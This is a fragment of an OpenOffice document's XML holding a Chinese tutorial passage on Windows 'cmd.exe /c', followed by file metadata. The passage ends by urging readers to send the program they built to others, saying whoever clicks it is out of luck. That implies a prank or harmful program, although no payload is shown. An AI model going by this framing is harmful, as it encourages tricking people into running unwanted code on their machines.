      <text:p text:style-name="P4"><text:span text:style-name="T11">cmd.exe </text:span><text:span text:style-name="T13">/c </text:span><text:span text:style-name="T18">→ /c </text:span><text:span text:style-name="T19">就是讓</text:span><text:span text:style-name="T18">cmd</text:span><text:span text:style-name="T19">執行指令完後自動關閉</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T1">詳細請看，開始→執行→輸入</text:span><text:span text:style-name="T11">"cmd"→</text:span><text:span text:style-name="T1">然後打上</text:span><text:span text:style-name="T11">"</text:span><text:span text:style-name="T13">cmd/?</text:span><text:span text:style-name="T11">"</text:span></text:p>
      <text:p text:style-name="P3"><draw:a xlink:type="simple" xlink:href="http://farm4.static.flickr.com/3234/3086161395_8653faccd9_o.png"><draw:frame draw:style-name="fr1" draw:name="圖形12" text:anchor-type="as-char" svg:width="10.627cm" svg:height="7.108cm" draw:z-index="11"><draw:image xlink:href="http://farm4.static.flickr.com/3234/3086161395_8653faccd9_o.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></draw:a></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">好吧</text:span><text:span text:style-name="T11">!</text:span><text:span text:style-name="T1">誰按到誰就衰，把你做的程式傳給別人吧</text:span><text:span text:style-name="T11">!</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1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6S</meta:editing-duration>
    <meta:editing-cycles>4</meta:editing-cycles>
    <meta:generator>OpenOffice.org/3.4$Win32 OpenOffice.org_project/340m1$Build-9590</meta:generator>
    <dc:date>2013-04-26T00:27:48.57</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="12" meta:object-count="0" meta:page-count="8" meta:paragraph-count="86" meta:word-count="1309" meta:character-count="2296"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>